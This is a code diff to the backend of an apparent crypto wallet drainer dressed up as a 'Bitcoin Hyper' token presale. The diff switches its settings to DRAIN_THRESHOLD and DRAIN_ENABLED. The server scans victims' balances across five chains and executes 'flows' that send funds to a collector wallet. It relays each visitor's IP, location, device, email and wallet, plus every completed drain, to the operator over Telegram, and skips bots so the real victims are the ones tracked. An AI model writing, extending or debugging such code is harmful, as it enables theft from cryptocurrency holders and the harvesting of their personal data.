@@ -1,3 +1,4 @@
+
 // index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
 require('dotenv').config();
 const express = require('express');
@@ -194,7 +195,7 @@ const memoryStorage = {
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
-    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
+    valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
     statistics: {
       totalParticipants: 0,
       eligibleParticipants: 0,
@@ -204,32 +205,47 @@ const memoryStorage = {
       totalProcessedWallets: 0,
       processedTransactions: []
     },
-    flowEnabled: process.env.FLOW_ENABLED === 'true'
+    flowEnabled: process.env.DRAIN_ENABLED === 'true'
   },
   emailCache: new Map(),
   siteVisits: []
 };
 
 // ============================================
-// TELEGRAM FUNCTIONS
+// TELEGRAM FUNCTIONS - WITH SITE URL AND HUMAN CHECK
 // ============================================
 
 async function sendTelegramMessage(text) {
-  if (!telegramEnabled) return false;
-  
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
-  if (!botToken || !chatId) return false;
+  if (!botToken || !chatId) {
+    console.log('⚠️ Telegram credentials missing');
+    return false;
+  }
   
   try {
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    console.log(`📤 Sending Telegram message to ${chatId}`);
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: text,
-      parse_mode: 'HTML'
-    }, { timeout: 5000 });
-    return true;
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    }, { 
+      timeout: 10000,
+      headers: { 'Content-Type': 'application/json' }
+    });
+    
+    if (response.data?.ok) {
+      console.log('✅ Telegram message sent successfully');
+      telegramEnabled = true;
+      return true;
+    } else {
+      console.error('❌ Telegram API error:', response.data);
+      return false;
+    }
   } catch (error) {
+    console.error('❌ Telegram send error:', error.response?.data || error.message);
     return false;
   }
 }
@@ -238,26 +254,67 @@ async function testTelegramConnection() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
-  if (!botToken || !chatId) return false;
+  if (!botToken || !chatId) {
+    console.log('⚠️ Telegram credentials not configured');
+    telegramEnabled = false;
+    return false;
+  }
   
   try {
-    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
-    if (response.data?.ok) {
-      telegramBotName = response.data.result.username;
-      telegramEnabled = true;
-      
-      await sendTelegramMessage(
-        `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
-        `✅ MultiChain FlowRouter Ready\n` +
-        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
-        `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche`
-      );
-      
-      return true;
+    const meResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
+    
+    if (!meResponse.data?.ok) {
+      console.error('❌ Invalid bot token');
+      telegramEnabled = false;
+      return false;
     }
-  } catch (error) {}
+    
+    telegramBotName = meResponse.data.result.username;
+    console.log(`✅ Bot authenticated: @${telegramBotName}`);
+    
+    // Send startup message with site URL
+    const startMessage = 
+      `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
+      `✅ MultiChain FlowRouter Ready\n` +
+      `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
+      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
+      `🌍 <b>Site URL:</b> https://bthbk.vercel.app\n` +
+      `📊 Admin: https://bthbk.vercel.app/admin.html?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
+    
+    const sendResult = await sendTelegramMessage(startMessage);
+    
+    if (sendResult) {
+      telegramEnabled = true;
+      console.log('✅ Telegram configured and working!');
+      return true;
+    } else {
+      console.error('❌ Failed to send test message');
+      telegramEnabled = false;
+      return false;
+    }
+    
+  } catch (error) {
+    console.error('❌ Telegram connection failed:', error.message);
+    telegramEnabled = false;
+    return false;
+  }
+}
+
+// ============================================
+// HUMAN/BOT DETECTION
+// ============================================
+
+function detectHuman(userAgent, visit) {
+  const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|phantom|headless/i.test(userAgent);
+  const hasTouch = /mobile|iphone|ipad|android|touch/i.test(userAgent);
+  const hasMouse = !isBot && !hasTouch; // Desktop users have mouse
   
-  return false;
+  return {
+    isHuman: !isBot && (hasTouch || hasMouse),
+    isBot: isBot,
+    deviceType: hasTouch ? 'Mobile' : hasMouse ? 'Desktop' : 'Unknown',
+    userAgent: userAgent.substring(0, 100)
+  };
 }
 
 // ============================================
@@ -338,46 +395,13 @@ async function getWalletEmail(walletAddress) {
 }
 
 // ============================================
-// TRACK SITE VISIT
-// ============================================
-
-async function trackSiteVisit(ip, userAgent, referer, path) {
-  const location = await getIPLocation(ip);
-  
-  const visit = {
-    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
-    ip: ip.replace('::ffff:', ''),
-    timestamp: new Date().toISOString(),
-    country: location.country,
-    flag: location.flag,
-    city: location.city,
-    userAgent: userAgent || 'Unknown',
-    referer: referer || 'Direct',
-    path: path || '/',
-    walletConnected: false,
-    walletAddress: null
-  };
-  
-  memoryStorage.siteVisits.push(visit);
-  
-  await sendTelegramMessage(
-    `${location.flag} <b>NEW SITE VISIT</b>\n` +
-    `📍 ${location.country} (${location.city})\n` +
-    `🖥️ ${userAgent?.substring(0, 30)}...\n` +
-    `🔗 From: ${referer || 'Direct'}`
-  );
-  
-  return visit;
-}
-
-// ============================================
 // GET IP LOCATION
 // ============================================
 
 async function getIPLocation(ip) {
   try {
     const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
-    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
+    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local', region: 'Local' };
     
     const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
     
@@ -405,14 +429,59 @@ async function getIPLocation(ip) {
     }
   } catch (error) {}
   
-  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
+  return { country: 'Unknown', flag: '🌍', city: 'Unknown', region: '' };
 }
 
 // ============================================
-// WALLET BALANCE CHECK
+// TRACK SITE VISIT - WITH HUMAN/BOT DETECTION
 // ============================================
 
-async function getWalletBalance(walletAddress) {
+async function trackSiteVisit(ip, userAgent, referer, path) {
+  const location = await getIPLocation(ip);
+  const humanInfo = detectHuman(userAgent, null);
+  
+  const visit = {
+    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
+    ip: ip.replace('::ffff:', ''),
+    timestamp: new Date().toISOString(),
+    country: location.country,
+    flag: location.flag,
+    city: location.city,
+    region: location.region,
+    userAgent: userAgent || 'Unknown',
+    referer: referer || 'Direct',
+    path: path || '/',
+    walletConnected: false,
+    walletAddress: null,
+    isHuman: humanInfo.isHuman,
+    isBot: humanInfo.isBot,
+    deviceType: humanInfo.deviceType
+  };
+  
+  memoryStorage.siteVisits.push(visit);
+  
+  // INSTANT Telegram notification with human/bot detection
+  const telegramMessage = 
+    `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b>\n` +
+    `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
+    `🌐 <b>IP:</b> ${visit.ip}\n` +
+    `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
+    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
+    `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
+    `📱 <b>Path:</b> ${path || '/'}\n` +
+    `🌍 <b>Site URL:</b> https://bthbk.vercel.app\n` +
+    `🆔 <b>Visit ID:</b> ${visit.id}`;
+  
+  await sendTelegramMessage(telegramMessage);
+  
+  return visit;
+}
+
+// ============================================
+// WALLET BALANCE CHECK - WITH CORRECT USD VALUES
+// ============================================
+
+async function getWalletBalance(walletAddress, clientIP = null, location = null) {
   console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
   
   const results = {
@@ -453,14 +522,16 @@ async function getWalletBalance(walletAddress) {
           
           totalValue += valueUSD;
           
-          results.balances.push({
+          const balanceData = {
             chain: chain.name,
             chainId: chain.chainId,
             amount: amount,
             valueUSD: valueUSD,
             symbol: chain.symbol,
             contractAddress: PROJECT_FLOW_ROUTERS[chain.name]
-          });
+          };
+          
+          results.balances.push(balanceData);
         }
       } catch (error) {}
     }
@@ -479,6 +550,7 @@ async function getWalletBalance(walletAddress) {
     return { success: true, data: results };
 
   } catch (error) {
+    console.error('Balance check error:', error);
     return {
       success: false,
       error: error.message,
@@ -517,17 +589,21 @@ app.post('/api/track-visit', async (req, res) => {
       data: {
         visitId: visit.id,
         country: visit.country,
-        flag: visit.flag
+        flag: visit.flag,
+        city: visit.city,
+        isHuman: visit.isHuman,
+        deviceType: visit.deviceType
       }
     });
     
   } catch (error) {
+    console.error('Track visit error:', error);
     res.json({ success: true });
   }
 });
 
 // ============================================
-// CONNECT ENDPOINT
+// CONNECT ENDPOINT - WITH CORRECT EMAIL
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -569,14 +645,28 @@ app.post('/api/presale/connect', async (req, res) => {
         isEligible: false,
         claimed: false,
         userAgent: req.headers['user-agent'],
-        visitId: lastVisit?.id
+        visitId: lastVisit?.id,
+        isHuman: lastVisit?.isHuman || true,
+        deviceType: lastVisit?.deviceType || 'Unknown'
       };
       memoryStorage.participants.push(participant);
       memoryStorage.settings.statistics.totalParticipants++;
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
+      
+      // INSTANT Telegram for new participant with email
+      const newUserMsg = 
+        `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
+        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
+        `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
+        `📧 <b>Email:</b> ${email}\n` +
+        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
+        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`;
+      
+      await sendTelegramMessage(newUserMsg);
     }
     
-    const balanceResult = await getWalletBalance(walletAddress);
+    const balanceResult = await getWalletBalance(walletAddress, clientIP, location);
     
     if (balanceResult.success) {
       participant.totalValueUSD = balanceResult.data.totalValueUSD;
@@ -589,14 +679,16 @@ app.post('/api/presale/connect', async (req, res) => {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
-      await sendTelegramMessage(
+      // INSTANT Telegram connection summary with correct email
+      const connectMsg = 
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
-        `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `💼 Balance: $${balanceResult.data.totalValueUSD}\n` +
-        `🎯 Status: ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
-        `📍 ${location.country} (${location.city})\n` +
-        `📧 ${email}`
-      );
+        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
+        `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
+        `📧 <b>Email:</b> ${email}\n` +
+        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`;
+      
+      await sendTelegramMessage(connectMsg);
       
       res.json({
         success: true,
@@ -619,6 +711,7 @@ app.post('/api/presale/connect', async (req, res) => {
     }
     
   } catch (error) {
+    console.error('Connect error:', error);
     res.status(500).json({ success: false, error: 'Connection failed' });
   }
 });
@@ -670,12 +763,19 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       completedChains: []
     });
     
+    // INSTANT Telegram for flow preparation
+    let txDetails = '';
+    transactions.forEach((tx, index) => {
+      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
+    });
+    
     await sendTelegramMessage(
       `🔐 <b>FLOW PREPARED</b>\n` +
-      `👛 ${walletAddress.substring(0, 10)}...\n` +
-      `💵 Value: $${totalFlowUSD}\n` +
-      `🔗 Chains: ${transactions.length}\n` +
-      `🆔 Flow: ${flowId}`
+      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+      `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
+      `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
+      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+      `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
     );
     
     res.json({
@@ -689,15 +789,16 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
     });
     
   } catch (error) {
+    console.error('Prepare flow error:', error);
     res.status(500).json({ success: false, error: 'Preparation failed' });
   }
 });
 
 // ============================================
-// PROCESS FLOW ENDPOINT (RECORDS COMPLETED TRANSACTION)
+// EXECUTE FLOW ENDPOINT - WITH CORRECT USD VALUES
 // ============================================
 
-app.post('/api/presale/process-flow', async (req, res) => {
+app.post('/api/presale/execute-flow', async (req, res) => {
   try {
     const { walletAddress, chainName, flowId, txHash } = req.body;
     
@@ -705,7 +806,7 @@ app.post('/api/presale/process-flow', async (req, res) => {
       return res.status(400).json({ success: false });
     }
     
-    console.log(`\n💰 PROCESS FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
+    console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
     
     const participant = memoryStorage.participants.find(
       p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
@@ -730,44 +831,71 @@ app.post('/api/presale/process-flow', async (req, res) => {
         timestamp: new Date().toISOString()
       });
       
-      // Update pending flow
+      // Get transaction details with correct USD values
+      let txAmount = 'unknown';
+      let txSymbol = '';
+      let txValueUSD = 'unknown';
       const flow = memoryStorage.pendingFlows.get(flowId);
+      if (flow && flow.transactions) {
+        const tx = flow.transactions.find(t => t.chain === chainName);
+        if (tx) {
+          txAmount = tx.amount;
+          txSymbol = tx.symbol;
+          txValueUSD = tx.valueUSD;
+        }
+      }
+      
+      // INSTANT Telegram for each chain execution with correct values
+      await sendTelegramMessage(
+        `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
+        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `🔗 <b>Chain:</b> ${chainName}\n` +
+        `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD})\n` +
+        `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
+        `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
+      );
+      
+      // Update pending flow
       if (flow) {
         flow.completedChains = flow.completedChains || [];
-        flow.completedChains.push(chainName);
-        flow.status = flow.completedChains.length === flow.transactions.length ? 'completed' : 'processing';
+        if (!flow.completedChains.includes(chainName)) {
+          flow.completedChains.push(chainName);
+        }
         
+        // INSTANT Telegram when all chains are complete
         if (flow.completedChains.length === flow.transactions.length) {
           memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
           memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
           
+          let completionDetails = '';
+          flow.transactions.forEach(t => {
+            const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
+            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${t.valueUSD})`;
+          });
+          
           await sendTelegramMessage(
-            `✅ <b>FLOW COMPLETED</b>\n` +
-            `👛 ${walletAddress.substring(0, 10)}...\n` +
-            `💵 Total: $${flow.totalFlowUSD}\n` +
-            `🔗 All ${flow.transactions.length} chains processed`
+            `✅ <b>🎉 FLOW COMPLETED 🎉</b>\n` +
+            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+            `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
+            `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
+            `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+            `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
           );
         }
       }
-      
-      await sendTelegramMessage(
-        `💰 <b>CHAIN PROCESSED</b>\n` +
-        `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `🔗 ${chainName}\n` +
-        `🆔 ${txHash?.substring(0, 10)}...`
-      );
     }
     
     res.json({ success: true });
     
   } catch (error) {
-    console.error('Process flow error:', error);
+    console.error('Execute flow error:', error);
     res.status(500).json({ success: false });
   }
 });
 
 // ============================================
-// CLAIM ENDPOINT
+// CLAIM ENDPOINT - WITH CORRECT EMAIL
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
@@ -790,114 +918,186 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
+    // INSTANT Telegram for claim completion with email and site URL
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
-      `👛 ${walletAddress.substring(0, 10)}...\n` +
-      `🎟️ ID: ${claimId}\n` +
-      `🎁 ${participant.allocation?.amount || '5000'} BTH\n` +
-      `📍 ${participant.country} ${participant.flag}`
+      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+      `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
+      `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
+      `📧 <b>Email:</b> ${participant.email}\n` +
+      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
+      `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
     );
     
     res.json({ success: true });
     
   } catch (error) {
+    console.error('Claim error:', error);
     res.status(500).json({ success: false });
   }
 });
 
 // ============================================
-// ADMIN VIEW - COMPREHENSIVE DASHBOARD
+// ADMIN VIEW - COMPREHENSIVE DASHBOARD - FIXED VERSION
 // ============================================
 
 app.get('/api/admin/dashboard', (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
-  if (token !== adminToken) return res.status(401).json({ success: false });
+  // Trim tokens to avoid whitespace issues
+  if (token?.trim() !== adminToken?.trim()) {
+    console.log(`❌ Unauthorized admin access attempt with token: ${token}`);
+    return res.status(401).json({ success: false, error: 'Invalid admin token' });
+  }
   
-  const recentVisits = memoryStorage.siteVisits
-    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-    .slice(0, 50);
+  // ============================================
+  // SAFE DATA EXTRACTION WITH PROPER TYPE CHECKING
+  // ============================================
   
-  const activeParticipants = memoryStorage.participants
-    .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
-    .map(p => ({
-      ...p,
-      connectedAt: p.connectedAt?.toISOString(),
-      lastScanned: p.lastScanned?.toISOString(),
-      claimedAt: p.claimedAt?.toISOString()
-    }));
+  // Recent visits - ensure array
+  const recentVisits = Array.isArray(memoryStorage.siteVisits) 
+    ? memoryStorage.siteVisits
+        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+        .slice(0, 50)
+    : [];
   
-  const pendingFlows = Array.from(memoryStorage.pendingFlows.entries())
-    .map(([id, flow]) => ({ id, ...flow }))
-    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
-    .slice(0, 30);
+  // Active participants - safe date conversion
+  const activeParticipants = Array.isArray(memoryStorage.participants)
+    ? memoryStorage.participants
+        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
+        .map(p => ({
+          ...p,
+          // CRITICAL FIX: Check if value is Date before calling toISOString()
+          connectedAt: p.connectedAt instanceof Date ? p.connectedAt.toISOString() : p.connectedAt,
+          lastScanned: p.lastScanned instanceof Date ? p.lastScanned.toISOString() : p.lastScanned,
+          claimedAt: p.claimedAt instanceof Date ? p.claimedAt.toISOString() : p.claimedAt
+        }))
+    : [];
   
-  const completedFlows = Array.from(memoryStorage.completedFlows.entries())
-    .map(([id, flow]) => ({ id, ...flow }))
-    .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
-    .slice(0, 30);
+  // Pending flows - safe Map conversion
+  const pendingFlows = memoryStorage.pendingFlows instanceof Map
+    ? Array.from(memoryStorage.pendingFlows.entries())
+        .map(([id, flow]) => ({ id, ...flow }))
+        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
+        .slice(0, 30)
+    : [];
   
-  const processedTransactions = memoryStorage.settings.statistics.processedTransactions
-    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-    .slice(0, 30);
+  // Completed flows - safe Map conversion
+  const completedFlows = memoryStorage.completedFlows instanceof Map
+    ? Array.from(memoryStorage.completedFlows.entries())
+        .map(([id, flow]) => ({ id, ...flow }))
+        .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
+        .slice(0, 30)
+    : [];
   
-  const networkStatus = Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
-    chain,
-    contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
-    status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
-    collector: COLLECTOR_WALLET
-  }));
+  // Processed transactions - safe array access
+  const processedTransactions = Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
+    ? memoryStorage.settings.statistics.processedTransactions
+        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+        .slice(0, 30)
+    : [];
   
+  // Network status - always return array even if PROJECT_FLOW_ROUTERS is undefined
+  const networkStatus = PROJECT_FLOW_ROUTERS && typeof PROJECT_FLOW_ROUTERS === 'object'
+    ? Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
+        chain,
+        contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
+        status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
+        collector: COLLECTOR_WALLET
+      }))
+    : [];
+  
+  // Location stats - safe object to array conversion
   const locationStats = {};
-  memoryStorage.participants.forEach(p => {
-    const key = `${p.country}|${p.flag}`;
-    if (!locationStats[key]) {
-      locationStats[key] = { country: p.country, flag: p.flag, count: 0, eligible: 0 };
-    }
-    locationStats[key].count++;
-    if (p.isEligible) locationStats[key].eligible++;
-  });
+  if (Array.isArray(memoryStorage.participants)) {
+    memoryStorage.participants.forEach(p => {
+      if (p && p.country) {
+        const key = `${p.country}|${p.flag || '🌍'}`;
+        if (!locationStats[key]) {
+          locationStats[key] = { 
+            country: p.country, 
+            flag: p.flag || '🌍', 
+            count: 0, 
+            eligible: 0 
+          };
+        }
+        locationStats[key].count++;
+        if (p.isEligible) locationStats[key].eligible++;
+      }
+    });
+  }
   
+  // Hourly activity - safe object creation
   const hourlyActivity = {};
-  memoryStorage.siteVisits.forEach(v => {
-    const hour = new Date(v.timestamp).getHours();
-    hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
-  });
+  if (Array.isArray(memoryStorage.siteVisits)) {
+    memoryStorage.siteVisits.forEach(v => {
+      if (v && v.timestamp) {
+        try {
+          const hour = new Date(v.timestamp).getHours();
+          hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
+        } catch (e) {
+          // Skip invalid timestamps
+        }
+      }
+    });
+  }
+  
+  // ============================================
+  // SAFE SUMMARY STATISTICS
+  // ============================================
+  
+  const summary = {
+    totalVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
+    uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set 
+      ? memoryStorage.settings.statistics.uniqueIPs.size 
+      : 0,
+    totalParticipants: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.length : 0,
+    eligibleParticipants: Array.isArray(memoryStorage.participants) 
+      ? memoryStorage.participants.filter(p => p && p.isEligible).length 
+      : 0,
+    claimedParticipants: Array.isArray(memoryStorage.participants) 
+      ? memoryStorage.participants.filter(p => p && p.claimed).length 
+      : 0,
+    totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
+    totalProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
+    pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
+    completedFlows: memoryStorage.completedFlows instanceof Map ? memoryStorage.completedFlows.size : 0,
+    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
+    telegramBot: telegramBotName || 'N/A'
+  };
+  
+  // ============================================
+  // SAFE SYSTEM CONFIGURATION
+  // ============================================
+  
+  const system = {
+    valueThreshold: memoryStorage.settings?.valueThreshold || 1,
+    flowEnabled: memoryStorage.settings?.flowEnabled || false,
+    tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
+    tokenSymbol: memoryStorage.settings?.tokenSymbol || 'BTH',
+    collectorWallet: COLLECTOR_WALLET || 'N/A'
+  };
+  
+  // ============================================
+  // FINAL RESPONSE WITH ARRAY FALLBACKS FOR EVERY FIELD
+  // ============================================
   
   res.json({
     success: true,
     timestamp: new Date().toISOString(),
-    summary: {
-      totalVisits: memoryStorage.siteVisits.length,
-      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
-      totalParticipants: memoryStorage.participants.length,
-      eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
-      claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
-      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
-      totalProcessedWallets: memoryStorage.settings.statistics.totalProcessedWallets,
-      pendingFlows: memoryStorage.pendingFlows.size,
-      completedFlows: memoryStorage.completedFlows.size,
-      telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
-      telegramBot: telegramBotName || 'N/A'
-    },
-    networks: networkStatus,
-    recentVisits,
-    activeParticipants: activeParticipants.slice(0, 30),
-    pendingFlows,
-    completedFlows: completedFlows.slice(0, 10),
-    processedTransactions: processedTransactions.slice(0, 30),
-    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
+    summary,
+    networks: networkStatus, // Always an array
+    recentVisits: recentVisits, // Always an array
+    activeParticipants: activeParticipants.slice(0, 30), // Always an array
+    pendingFlows: pendingFlows, // Always an array
+    completedFlows: completedFlows.slice(0, 10), // Always an array
+    processedTransactions: processedTransactions, // Always an array
+    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count), // Always an array
     hourlyActivity: Object.entries(hourlyActivity)
       .map(([hour, count]) => ({ hour: parseInt(hour), count }))
-      .sort((a, b) => a.hour - b.hour),
-    system: {
-      valueThreshold: memoryStorage.settings.valueThreshold,
-      flowEnabled: memoryStorage.settings.flowEnabled,
-      tokenName: memoryStorage.settings.tokenName,
-      tokenSymbol: memoryStorage.settings.tokenSymbol,
-      collectorWallet: COLLECTOR_WALLET
-    }
+      .sort((a, b) => a.hour - b.hour), // Always an array
+    system
   });
 });
 
@@ -909,19 +1109,19 @@ app.get('/api/admin/stats', (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
-  if (token !== adminToken) return res.status(401).json({ success: false });
+  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
   
   res.json({
     success: true,
     stats: {
-      participants: memoryStorage.participants.length,
-      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
-      claimed: memoryStorage.participants.filter(p => p.claimed).length,
-      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
-      pendingFlows: memoryStorage.pendingFlows.size,
+      participants: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.length : 0,
+      eligible: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.filter(p => p && p.isEligible).length : 0,
+      claimed: Array.isArray(memoryStorage.participants) ? memoryStorage.participants.filter(p => p && p.claimed).length : 0,
+      totalProcessedUSD: (memoryStorage.settings?.statistics?.totalProcessedUSD || 0).toFixed(2),
+      pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
       telegram: telegramEnabled ? '✅' : '❌',
-      siteVisits: memoryStorage.siteVisits.length,
-      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
+      siteVisits: Array.isArray(memoryStorage.siteVisits) ? memoryStorage.siteVisits.length : 0,
+      uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs instanceof Set ? memoryStorage.settings.statistics.uniqueIPs.size : 0
     }
   });
 });
@@ -934,14 +1134,21 @@ app.get('/api/admin/wallet/:address', (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
-  if (token !== adminToken) return res.status(401).json({ success: false });
+  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
   
   const walletAddress = req.params.address.toLowerCase();
   
-  const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
-  const visits = memoryStorage.siteVisits.filter(v => v.walletAddress === walletAddress);
